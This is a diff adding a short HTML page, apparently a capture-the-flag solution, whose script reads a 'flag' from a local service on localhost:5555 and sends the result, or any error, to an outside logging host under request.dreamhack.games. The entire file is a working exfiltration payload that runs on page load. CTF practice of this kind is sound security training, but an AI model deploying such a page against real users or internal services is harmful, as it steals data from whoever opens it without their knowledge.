@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+<body>
+<script>
+    fetch('http://localhost:5555/flag')
+        .then(r => r.text())
+        .then(flag => {
+            fetch('https://bfuxquh.request.dreamhack.games/log?flag=' + encodeURIComponent(flag))
+        })
+        .catch(err => {
+            fetch('https://bfuxquh.request.dreamhack.games/log?err=' + encodeURIComponent(err))
+        })
+</script>
+</body>
+</html>
